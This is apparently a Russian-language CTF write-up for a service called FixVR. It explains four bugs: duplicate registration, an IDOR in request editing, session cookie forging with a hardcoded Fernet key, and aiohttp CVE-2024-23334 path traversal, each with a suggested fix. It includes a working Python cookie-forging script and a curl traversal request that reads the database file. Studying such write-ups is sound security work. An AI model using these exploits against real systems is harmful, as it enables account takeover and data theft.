# Разбор сервиса FixVR
## Уязвимость 1: перерегистрация существующего пользователя
Рассмотрим по шагам логику регистрации нового пользователя:
1. Проверка наличия email и password в запросе, полученном от пользователя, проверка длины поля email.  
2. За непосредственное добавление нового пользоавтеля в таблицу users отвечает эта строчка:  
```await cursor.execute('INSERT INTO users (email, password) VALUES (?, ?)', (email, password))```  
3. Вполне обчыный запрос, но стоит обратить внимание на то, как создается сама таблица пользователей:
```sql
CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT NOT NULL
        )
```
Главное, что нужно тут заметить - отсутствие ограничения целостности **UNIQUE** для поля email. Вместе с тем фактом, что до выполнения INSERT, нет отдельной проверки существования email в таблице, мы можем сделать вывод, что возможна повторная регистрация уже существующего пользователя.

### Эксплуатация:
![image](https://github.com/bysmaks/OmCTF2024-develop/assets/44548000/3762e85f-398e-4633-8cba-05a4f8adb4bf)

### Защита:
1. Добавить ограничение UNIQUE на поле email.
2. Добавтиь проверку существование почты в таблице users на бэкенде перед добавлением новой записи через отдельный SELECT запрос.

## Уязвимость 2: IDOR через редактирование заявок.
Рассмотрим этот кусок кода:
```python
...
app.router.add_route('POST', '/api/edit-request/{requestId}', edit_request)
...

@require_login
async def edit_request(request):
    data = await request.json()
    requestId = request.match_info['requestId']
    title = data.get('title')
    description = data.get('description')

    if not requestId:
        return web.json_response({'message': 'Request ID is missing'}, status=400)

    try:
        async with aiosqlite.connect(DB_NAME) as db:
            cursor = await db.cursor()

            fields_to_update = []
            values = []
            if title is not None:
                if len(title) > 256:
                    return web.json_response({'message': 'Title exceeds maximum length'}, status=400)
                fields_to_update.append('title = ?')
                values.append(title)
            if description is not None:
                if len(description) > 256:
                        return web.json_response({'message': 'Description exceeds maximum length'}, status=400)
                fields_to_update.append('description = ?')
                values.append(description)

            values.append(requestId)

            sql = 'UPDATE requests SET {} WHERE id = ?'.format(', '.join(fields_to_update))

            await cursor.execute(sql, values)
            await db.commit()

            await cursor.execute('SELECT title, description FROM requests WHERE id = ?', (requestId,))
            updated_request = await cursor.fetchone()
    except Exception as e:
        return web.json_response({'message': 'Error while editing request'}, status=500)

    return web.json_response({
        'message': 'Request edited successfully',
        'request': {
            'title': updated_request[0],
            'description': updated_request[1]
        }
    })
```
Тут мы видим как составляется запрос, редактирующий данные в уже существующей заявке. И полсе этого возвращает нам title и description измененной заявки.  
  
Первый важный момент: `'UPDATE requests SET {} WHERE id = ?'.format(', '.join(fields_to_update))` - в этом sql запросе отсутствует проверка на принадлежость редактируемой заявки к пользователю, который пытается её отредактировать. => **Это позволяет нам отредактировать любую существующую заявку.**
  
Второй ключевой момент здесь в том, что если, например, description не был передан в json'е POST запроса на /api/edit-request/<id>, то description не будет обновлён, и изменится только переданный title.  

### Эксплуатация:
Пример json'а, который обновит только title: `{"title":"new_title"}` (поле description не указано!)
В ответ на такой запрос мы получим: 
```json
{
    "message": "Request edited successfully",
    "request": {
        "title": "new_title",
        "description": "OLD desctiption"
    }
}
```
Таким образом, перебирая id заявок мы можем изменять только title заявок и собирать флаги, вычитывая исходное описание каждой заявки из ответов сервера. 

### Защита:
1. Добавить проверку соответствия полей requests.user_id и users.id перед выполнением UPDATE запроса.

## Уязвимость 3: Session forging.
Если взглянуть на файл main.py, можно заметить то, как инициализируется middleware отвечающий за работу с сессиями пользователей:  
```python
CIPHER_KEY = b'\xbe\x08\xc1B\xbe\xbb\x19\xe1\xa02\xe2A\xcb\x8a\xce\x95\x87\xd5\x80g\xe3\xd4U5P\x07\x86D\x9d\xa0\xde\xb1'
app = web.Application(middlewares=[session_middleware(EncryptedCookieStorage(CIPHER_KEY))])
```
*EncryptedCookieStorage хранит данные сеанса в cookies, как это делает SimpleCookieStorage, но кодирует данные с помощью криптографического шифра Fernet.*
Захардкоженный ключ **(CIPHER_KEY)** используется для шифрования json с теми данными, которые наше приложение передаст пользователю. В нашем случе туда клался только email пользователя.    

Например:  
plaintext: `{"created": 1713180237, "session": {"user": "already_existing_email@mail.com"}}`  
  
encoded: `gAAAAABmHQ5NCO1DVyx_PVgSp7ocZTi7htBN8uPMSulWE0MUCbRQNxGYjsXRormpVEIqrvSVwVwJWPQ4tburbiraEDyZSGGrxFbSJEUywAINW8f2wxoobwIkltCJ3bMp8LZpv6YE7WOUWIsdXO626gnOpK67aix8DQuylD2PzaGaSEfXJlr3JdY=`

### Эксплуатация:
```python
from cryptography.fernet import Fernet
import base64

# The key used for encryption and decryption
CIPHER_KEY = b'\xbe\x08\xc1B\xbe\xbb\x19\xe1\xa02\xe2A\xcb\x8a\xce\x95\x87\xd5\x80g\xe3\xd4U5P\x07\x86D\x9d\xa0\xde\xb1' 
CIPHER_KEY = base64.b64encode(CIPHER_KEY)

# Create a Fernet cipher
cipher = Fernet(CIPHER_KEY)

# The encrypted cookie AIOHTTP_SESSION
def decrypt(AIOHTTP_SESSION):
    # Decrypt the cookie
    decrypted_cookie = cipher.decrypt(AIOHTTP_SESSION.encode())

    # Print the decrypted cookie
    return decrypted_cookie.decode()

def encrypt(cookie_to_encrypt):
    # The input string needs to be converted to bytes
    input_bytes = cookie_to_encrypt.encode()

    # Encrypt the input bytes
    encrypted_bytes = cipher.encrypt(input_bytes)

    # Convert the encrypted bytes back to a string
    encrypted_string = encrypted_bytes.decode()

    return encrypted_string

AIOHTTP_SESSION = "gAAAAABmHQ5NCO1DVyx_PVgSp7ocZTi7htBN8uPMSulWE0MUCbRQNxGYjsXRormpVEIqrvSVwVwJWPQ4tburbiraEDyZSGGrxFbSJEUywAINW8f2wxoobwIkltCJ3bMp8LZpv6YE7WOUWIsdXO626gnOpK67aix8DQuylD2PzaGaSEfXJlr3JdY="
print("cookie decrypted:")
print(decrypt(AIOHTTP_SESSION))
print()
print("new cookie encrypted:")
cookie_to_encrypt = '{"created": 1713180237, "session": {"user": "forged_email@mail.com"}}'
print(encrypt(cookie_to_encrypt))
```
output:
```python
cookie decrypted:
{"created": 1713180237, "session": {"user": "already_existing_email@mail.com"}}

new cookie encrypted:
gAAAAABmHRvhvxeIjMoW1e91WJMUg3XydieHtcn4LFVOUJ-ISLbeKdL1RJTK2F6ydYdHkB2zvNms2FmW6OOQdTw6R8fKKrGHMjYyGFUUv8dAmcbzImrrEHNL2_DhO-bFfMMYJ4O92YGwroFNj1Mam_w07LJfnXKnzQt8kEethhinTYuNjpeGRag=
```

## Уязвимость 4: CVE-2024-23334 aiohttp < 3.9.2.
*(https://nvd.nist.gov/vuln/detail/CVE-2024-23334)*

Рассмотрим файл requirements.txt:
```
aiohttp==3.9.1
aiohttp_session==2.12.0
aiosqlite==0.20.0
cryptography==42.0.1
```
Как можно заметить версия aiohttp явно указана == 3.9.1 (< 3.9.2). Делаем вывод, что версия уязвима, но для эксплуатации LFI есть необходимое условие:  
**"When 'follow_symlinks' is set to True, there is no validation to check if reading a file is within the root directory"**  
Благо, в нашем приложении это значение по умолчанию установлено в True:  
```app.router.add_static('/static/', path='./static', name='static', follow_symlinks=True)```

### Эксплуатация:
1. Готовые PoC скрипты, например https://github.com/jhonnybonny/CVE-2024-23334
2. Руками `curl 'http://127.0.0.1:8080/static/%2e%2e/database.db' --output -`  
![image](https://github.com/bysmaks/OmCTF2024-develop/assets/44548000/223e1226-f273-457f-bfed-e048bd7d5c3d)  
Таким образом, можно просто вычитать файл .db с содержимым sqlite3 базы данных, откуда можно спокойно извлечь все флаги.

### Защита:
1. Обновить версию aiohttp до 3.9.2 или выше.
2. Установить follow_symlinks=False
